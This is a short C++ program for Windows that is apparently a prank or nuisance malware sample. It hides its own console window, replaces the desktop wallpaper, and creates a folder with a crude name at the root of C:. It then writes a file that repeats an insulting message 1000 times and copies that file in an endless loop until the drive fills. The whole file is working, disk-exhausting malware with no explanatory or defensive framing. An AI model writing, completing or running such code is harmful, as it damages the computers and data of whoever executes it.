#include <iostream>
#include <fstream>
#include <string>
#include <filesystem>
#include <Windows.h>
#include <direct.h>

std::string copy(std::string s, size_t count)//function that will be copy text
{
    std::string ret;
    for(size_t i = 0; i < count; i++)
    {
        ret = ret + s;
    }
    return ret;
}

int main()
{
    std::string file_text = "ur computer fucked. get a new one. ";
    ShowWindow( GetConsoleWindow(), SW_HIDE );
    const wchar_t *path = L"C:\\image.png";
    int result;
    result = SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void *)path, SPIF_UPDATEINIFILE);//set black as wallaper
    size_t i = 0;
    _mkdir("C:\\sex\\");//create folder
    std::ofstream file;
    file.open ("C:\\sex\\crush_ur_ass" + std::to_string(i)  + ".txt", std::ofstream::out | std::ofstream::app);//create new file
    file << copy(file_text,1000);
    file.close();
    i++;
    while (true)
    {
        
        std::filesystem::copy("C:\\sex\\crush_ur_ass0.txt", "C:\\sex\\crush_ur_ass" + std::to_string(i)  + ".txt"); //copy fie in created folder
        i++;
        

    }
    
    

    return 0;
}
